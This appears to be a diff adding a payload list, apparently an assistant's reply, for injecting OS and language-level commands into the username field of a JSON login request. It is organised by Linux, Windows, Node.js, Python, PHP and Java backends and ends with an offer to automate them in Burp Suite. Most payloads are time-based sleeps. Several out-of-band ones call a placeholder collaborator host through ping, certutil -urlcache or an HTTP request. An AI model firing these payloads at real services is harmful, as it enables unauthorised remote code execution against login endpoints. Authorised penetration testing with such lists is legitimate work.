@@ -1,0 +1,82 @@
+## Linux Targets (Bash/sh)
+These payloads attempt to break out of the server's backend command structure using semi-colons, backticks, pipes, or background job markers.
+
+* Time-Based (Delayed response):
+
+{"password":"9012","username":"652223518; sleep 10;","rememberMe":false}
+
+* Inline Execution (Using backticks):
+
+{"password":"9012","username":"652223518`sleep 10`","rememberMe":false}
+
+* Logical Operator (Runs if the first part fails/succeeds):
+
+{"password":"9012","username":"652223518 || sleep 10","rememberMe":false}
+
+* Out-of-Band (Triggers an external ping network request):
+
+{"password":"9012","username":"652223518; ping -c 4 YOUR_COLLABORATOR_URL","rememberMe":false}
+
+
+## Windows Targets (CMD/PowerShell)
+Windows does not use sleep. It relies on the ping command targeting the local loopback adapter (127.0.0.1) to create a predictable time delay.
+
+* Time-Based (CMD Operator):
+
+{"password":"9012","username":"652223518 & ping -n 11 127.0.0.1 &","rememberMe":false}
+
+* PowerShell Time-Based (If PowerShell handles the backend command):
+
+{"password":"9012","username":"652223518; Start-Sleep -s 10;","rememberMe":false}
+
+* Out-of-Band (Forcing a DNS/HTTP lookup via certutil):
+
+{"password":"9012","username":"652223518 & certutil -urlcache -f http://YOUR_COLLABORATOR_URL/ x &","rememberMe":false}
+
+
+## Node.js (JavaScript)
+If the backend incorrectly uses functions like eval() or Function() on incoming JSON data, you can inject standard Node.js server packages.
+
+* Time-Based (Blocking execution via child process):
+
+{"password":"9012","username":"652223518'; require('child_process').execSync('sleep 10'); //","rememberMe":false}
+
+* Out-of-Band (Spawning a basic network call):
+
+{"password":"9012","username":"652223518'; require('http').get('http://YOUR_COLLABORATOR_URL'); //","rememberMe":false}
+
+
+## Python
+Python RCE typically exploits dangerous implementations of eval(), exec(), or insecure deserialization libraries.
+
+* Time-Based (Importing the standard operating system module):
+
+{"password":"9012","username":"652223518'; __import__('os').system('sleep 10'); #","rememberMe":false}
+
+* Time-Based (Alternative using the time module):
+
+{"password":"9012","username":"652223518'; __import__('time').sleep(10); #","rememberMe":false}
+
+
+## PHP
+PHP functions like eval(), passthru(), system(), or shell_exec() are highly targeted when inputs are poorly sanitized.
+
+* Inline Language Execution:
+
+{"password":"9012","username":"652223518'; sleep(10); //","rememberMe":false}
+
+* System Command Wrapper:
+
+{"password":"9012","username":"652223518'; system('sleep 10'); //","rememberMe":false}
+
+
+## Java
+Java RCE frequently targets old configurations prone to Expression Language (EL) injections or object deserialization.
+
+* Expression Language (EL Injection):
+
+{"password":"9012","username":"${Runtime.getRuntime().exec('sleep 10')}","rememberMe":false}
+
+
+------------------------------
+Which specific payload type from this list would you like to build or automate first inside your Burp Suite project?
